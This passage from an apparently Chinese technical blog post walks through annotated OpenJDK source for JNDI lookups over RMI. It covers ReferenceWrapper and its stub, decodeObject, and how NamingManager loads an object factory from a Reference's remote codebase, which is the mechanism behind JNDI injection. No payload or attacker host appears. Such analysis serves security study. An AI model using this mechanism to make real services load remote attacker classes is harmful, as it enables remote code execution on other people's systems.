<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将从 RMI Registry 取回的“原始远程对象”解码为最终可返回给调用者的 JNDI 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 解码流程：</span></span><br><span class="line"><span class="comment"> * 1) 若 r 是 RemoteReference（注意：这是 JNDI 自己的 Remote 接口，不是 java.rmi.server.RemoteRef），</span></span><br><span class="line"><span class="comment"> *    则先调用 getReference() 解包出 javax.naming.Reference；</span></span><br><span class="line"><span class="comment"> *    这对应服务端用 ReferenceWrapper 绑定的情况（Stub 实现了 RemoteReference）。</span></span><br><span class="line"><span class="comment"> * 2) 然后调用 NamingManager.getObjectInstance(...)：</span></span><br><span class="line"><span class="comment"> *    - 若 obj 是 Reference/Referenceable：按其 factory/factoryLocation 与 RefAddr 参数，</span></span><br><span class="line"><span class="comment"> *      触发 ObjectFactory#getObjectInstance(...) 还原最终对象</span></span><br><span class="line"><span class="comment"> *      （本地 classpath 优先；仅在 trustURLCodebase=true 时才会尝试远程 codebase）。</span></span><br><span class="line"><span class="comment"> *    - 其他类型：按 JNDI 规则原样返回或经由已注册的工厂做转换。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 该对象相对于当前上下文的名称（通常是已解析前缀，用于工厂/上下文参考）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote r, Name name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ① 如果是 RemoteReference（例如 ReferenceWrapper 的 stub），</span></span><br><span class="line">        <span class="comment">//    先抽取出真正的 javax.naming.Reference；否则就直接使用远程返回的对象。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (r <span class="keyword">instanceof</span> RemoteReference)</span><br><span class="line">                   ? ((RemoteReference) r).getReference()</span><br><span class="line">                   : (Object) r;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ② 交给 JNDI 的工厂总管做最终实例化/转换：</span></span><br><span class="line">        <span class="comment">//    可能调用到 ObjectFactory#getObjectInstance(...)，</span></span><br><span class="line">        <span class="comment">//    返回的就是 lookup(...) 的最终结果。</span></span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(obj, name, <span class="built_in">this</span>, environment);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="comment">// ③ 已是 JNDI 语义的异常：直接上抛，保持原语义/栈信息。</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// ④ 远程通信/反序列化等底层异常：包装为 NamingException 再抛出，统一成 JNDI 语义。</span></span><br><span class="line">        <span class="keyword">throw</span> (NamingException) wrapRemoteException(e).fillInStackTrace();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// ⑤ 其他运行时/受检异常：转换为 NamingException，并设置根因，避免信息丢失。</span></span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        ne.setRootCause(e);</span><br><span class="line">        <span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于我们实际获取的远程对象 <code>ReferenceWrapper_Stub</code> 是代理类，因此实际会调用到它的 <code>invoke</code> 方法发起一次 RMI 远程调用来调用注册中心的 <code>RemoteReference#getReference</code> 方法。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>ReferenceWrapper_Stub</code> 是由 <code>GenerateClasses.gmk</code> 规则在 <strong>构建期</strong> 用 <code>rmic</code> 生成，因此我们在 OpenJDK 源码中看不到这个类的实现。</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI 静态 Stub（rmic -v1.2 风格）。</span></span><br><span class="line"><span class="comment"> * 对应的远程接口：&#123;<span class="doctag">@link</span> com.sun.jndi.rmi.registry.RemoteReference&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 作用：把本地对 getReference() 的调用，经由 RemoteRef.invoke(...) 编码后</span></span><br><span class="line"><span class="comment"> * 发送到远端的 ReferenceWrapper 实例上执行，并把返回值反序列化回来。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ReferenceWrapper_Stub</span> <span class="keyword">extends</span> <span class="title class_">RemoteStub</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">RemoteReference</span>, Remote &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * RMI 方法哈希（operation hash）。</span></span><br><span class="line"><span class="comment">     * 计算方式遵循 RMI 规范：对方法签名字符串做 SHA-1，取前 8 字节为 long。</span></span><br><span class="line"><span class="comment">     * 这里对应的方法是 RemoteReference#getReference()。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">HASH_getReference</span> <span class="operator">=</span> <span class="number">3529874867989176284L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 反射缓存：指向 RemoteReference.getReference() 方法对象 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Method M_getReference;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            M_getReference = RemoteReference.class.getMethod(<span class="string">&quot;getReference&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="comment">// rmic 生成的 stub 在初始化失败时会抛出 NoSuchMethodError</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(<span class="string">&quot;stub class initialization failed: getReference not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 由 RMI 运行时在接收端或连接端创建 Stub 时注入实际的远程引用实现（UnicastRef）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReferenceWrapper_Stub</span><span class="params">(RemoteRef ref)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 远程调用入口：将调用转发给远端的 ReferenceWrapper 实例。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 远端返回的 javax.naming.Reference</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> RemoteException   网络/远程调用异常</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NamingException   远端实现声明会抛出的受检异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.invoke(</span><br><span class="line">                    <span class="built_in">this</span>,                 <span class="comment">// stub 自身（用于填充调用上下文）</span></span><br><span class="line">                    M_getReference,       <span class="comment">// 目标方法（用于序列化方法签名）</span></span><br><span class="line">                    <span class="literal">null</span>,                 <span class="comment">// 无参数</span></span><br><span class="line">                    HASH_getReference     <span class="comment">// 方法哈希（operation number）</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">return</span> (Reference) ret;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// 运行时异常直接透传（与 rmic 生成代码一致）</span></span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="comment">// 远程异常直接透传</span></span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// 接口声明的受检异常直接透传</span></span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 其他未声明的受检异常，包装成 UnexpectedException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而前面我们使用 <code>ReferenceWrapper</code> 包装了一个 <code>Reference</code> 对象，因此实际上这次远程对象获取的是我们定义的 <code>Reference</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ReferenceWrapper 是一个用于“远程暴露” JNDI Reference 的包装类。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 它在服务端进程中持有一个 &#123;<span class="doctag">@link</span> javax.naming.Reference&#125;（wrappee），</span></span><br><span class="line"><span class="comment"> * 通过 RMI 将该引用以远程对象的方式提供给客户端：</span></span><br><span class="line"><span class="comment"> * 客户端拿到的是本类的 RMI stub，随后远程调用 &#123;<span class="doctag">@link</span> #getReference()&#125;，</span></span><br><span class="line"><span class="comment"> * 把服务端持有的 Reference 序列化回客户端，客户端再交给</span></span><br><span class="line"><span class="comment"> * NamingManager.getObjectInstance(...) 去还原为真正对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型调用链（客户端）：</span></span><br><span class="line"><span class="comment"> * InitialContext.lookup(&quot;rmi://...&quot;) → RegistryContext.decodeObject(...)</span></span><br><span class="line"><span class="comment"> *   → 发现返回的是 RemoteReference（即本类的 stub）</span></span><br><span class="line"><span class="comment"> *   → 远程调用 getReference() 取出 Reference</span></span><br><span class="line"><span class="comment"> *   → NamingManager.getObjectInstance(Reference, ...) → ObjectFactory</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：本类属于 “jdk.naming.rmi” 模块，配套有静态生成的 stub 类</span></span><br><span class="line"><span class="comment"> * ReferenceWrapper_Stub（历史上由 rmic 生成，或在新版本以预生成源码形式存在）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Scott Seligman</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceWrapper</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span>  <span class="comment">// 继承后会在构造时 export 为可远程访问的对象</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">RemoteReference</span> <span class="comment">// 远程接口：声明了 getReference()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/** 被包装的 JNDI 引用；真正要返回给客户端（经序列化传输）的对象 */</span></span><br><span class="line">    <span class="keyword">protected</span> Reference wrappee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造器：</span></span><br><span class="line"><span class="comment">     * - 由于继承了 UnicastRemoteObject，构造时会执行 export（导出远程对象、建立 RemoteRef），</span></span><br><span class="line"><span class="comment">     *   因此可能抛出 RemoteException。</span></span><br><span class="line"><span class="comment">     * - NamingException 出现在签名中是为了与 JNDI 语义/接口族保持一致（某些版本接口声明如此），</span></span><br><span class="line"><span class="comment">     *   本实现体内通常不会主动抛出。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReferenceWrapper</span><span class="params">(Reference wrappee)</span></span><br><span class="line">            <span class="keyword">throws</span> NamingException, RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// super() 隐式调用：完成 RMI 导出（监听端口/创建远程引用等）</span></span><br><span class="line">        <span class="built_in">this</span>.wrappee = wrappee; <span class="comment">// 保存服务端持有的 Reference</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 远程方法：把服务端持有的 Reference 返回给调用方（经 RMI 序列化传输）。</span></span><br><span class="line"><span class="comment">     * 客户端随后会调用 NamingManager.getObjectInstance(...) 对该 Reference 进行“工厂还原”。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 服务端包装的 javax.naming.Reference</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> java.rmi.RemoteException   网络/远程调用错误</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> javax.naming.NamingException （接口可能声明；实现通常不抛）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> wrappee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** RMI 序列化版本号：确保不同版本间的远程调用/反序列化兼容 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6078186197417641456L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后 <code>decodeObject</code> 会调用 <code>NamingManager#getObjectInstance</code> 来根据 <code>Reference</code> 解析出实际的对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (r <span class="keyword">instanceof</span> RemoteReference)</span><br><span class="line">            ? ((RemoteReference)r).getReference()</span><br><span class="line">            : (Object)r;</span><br><span class="line"><span class="keyword">return</span> NamingManager.getObjectInstance(obj, name, <span class="built_in">this</span>, environment);</span><br></pre></td></tr></table></figure></div>

<p>对于 <code>Reference</code>，<code>NamingManager#getObjectInstance</code> 会调用 <code>NamingManager#getObjectFactoryFromReference</code> 查找我们在 <code>Reference</code> 中通过 <code>factoryLocation</code> 和 <code>factory</code> 指定的工厂类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尽量把 refInfo 规范化为 Reference：</span></span><br><span class="line"><span class="comment">// - 如果本身就是 Reference：直接使用；</span></span><br><span class="line"><span class="comment">// - 如果实现了 Referenceable：通过 getReference() 取出其 Reference 表示。</span></span><br><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">    ref = (Reference) refInfo;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">    ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Object answer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 从 Reference 中取“工厂类名”（可能为 null）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">    <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 情况①：Reference 显式指定了工厂类名 → “独占使用”该工厂</span></span><br><span class="line">        <span class="comment">// 语义：只尝试这个工厂来创建对象；如果失败，不再继续走 URL 工厂</span></span><br><span class="line">        <span class="comment">// 或 Context.OBJECT_FACTORIES 等其他路径。</span></span><br><span class="line">        factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">        <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 成功加载到工厂：把 Reference 与 name/nameCtx/environment 传给工厂，</span></span><br><span class="line">            <span class="comment">// 由工厂的 getObjectInstance(...) 生成最终对象并返回。</span></span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx, environment);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 无法加载工厂（例如：类不在本地 classpath，且 Reference 未提供可用 codebase，</span></span><br><span class="line">        <span class="comment">// 或现代 JDK 默认禁用 trustURLCodebase 导致远程加载被拒）。</span></span><br><span class="line">        <span class="comment">// 按规范：直接返回原始 refInfo，不再尝试其他策略。</span></span><br><span class="line">        <span class="keyword">return</span> refInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getObjectFactoryFromReference</code> 首先会尝试从本地 classpath 中加载工厂类，如果加载失败则会将 <code>Reference</code> 的 <code>factoryLocation</code> 作为 <code>codebase</code> 从远程加载工厂类。如果成功加载则会将工厂类实例化并返回</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据 Reference 中记录的“工厂类名 + 可选的 codebase（工厂位置）”来加载工厂类，</span></span><br><span class="line"><span class="comment"> * 并返回该工厂类的实例（必须实现 ObjectFactory，且具备 public 无参构造）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 加载顺序（失败则回退）：</span></span><br><span class="line"><span class="comment"> * 1) 先用“当前/默认”的类加载器尝试加载 factoryName；</span></span><br><span class="line"><span class="comment"> * 2) 若不在本地 classpath，再读取 ref.getFactoryClassLocation()（codebase），</span></span><br><span class="line"><span class="comment"> *    通过该位置尝试加载（例如 http/file/ftp 等）；</span></span><br><span class="line"><span class="comment"> *    —— 若成功则返回实例；若仍失败则返回 null。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明与注意：</span></span><br><span class="line"><span class="comment"> * - 本方法只吞掉 ClassNotFoundException（让后续路径继续尝试），</span></span><br><span class="line"><span class="comment"> *   其它异常（IllegalAccessException、InstantiationException、MalformedURLException）</span></span><br><span class="line"><span class="comment"> *   直接抛给调用方。</span></span><br><span class="line"><span class="comment"> * - 当使用 codebase 远程加载时，是否允许下载由运行时策略决定</span></span><br><span class="line"><span class="comment"> *  （如 JDK 8u191+ 默认禁用 trustURLCodebase），禁用时这里可能始终加载失败。</span></span><br><span class="line"><span class="comment"> * - 返回前会做强制类型转换为 ObjectFactory；若工厂类未实现该接口，将抛出</span></span><br><span class="line"><span class="comment"> *   ClassCastException（运行时异常，未在签名声明）。</span></span><br><span class="line"><span class="comment"> * - 这里使用 Class#newInstance()（要求 public 无参构造），在新版本 JDK 已被标记过时；</span></span><br><span class="line"><span class="comment"> *   现代写法应为 clazz.getDeclaredConstructor().newInstance()。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref          非空；包含工厂类名与可选 codebase 的 Reference</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factoryName  非空；工厂类的完全限定名（FQCN）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>             成功则返回工厂实例；否则返回 null（未能加载工厂）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalAccessException   无权访问无参构造时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InstantiationException   抽象类/接口或构造失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException    codebase 字符串不是合法 URL 时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException, InstantiationException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 优先使用当前（上下文）类加载器加载工厂类</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clas = helper.loadClass(factoryName);  <span class="comment">// VersionHelper 抽象了不同 JDK 的装载细节</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// 忽略，转而尝试 codebase 路径</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其余异常（如安全限制）不在此处吞掉，直接向上抛出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 若本地未找到且 Reference 指定了工厂位置（codebase），</span></span><br><span class="line">    <span class="comment">//    则基于该 codebase 再次尝试加载</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 仍找不到则保持 clas=null，稍后返回 null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 成功加载则实例化并返回；否则返回 null</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>NamingManager</code> 中加载类使用的类加载器 <code>helper</code> 是通过 <code>VersionHelper#getVersionHelper</code> 函数设置的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">VersionHelper</span> <span class="variable">helper</span> <span class="operator">=</span> VersionHelper.getVersionHelper();</span><br></pre></td></tr></table></figure></div>

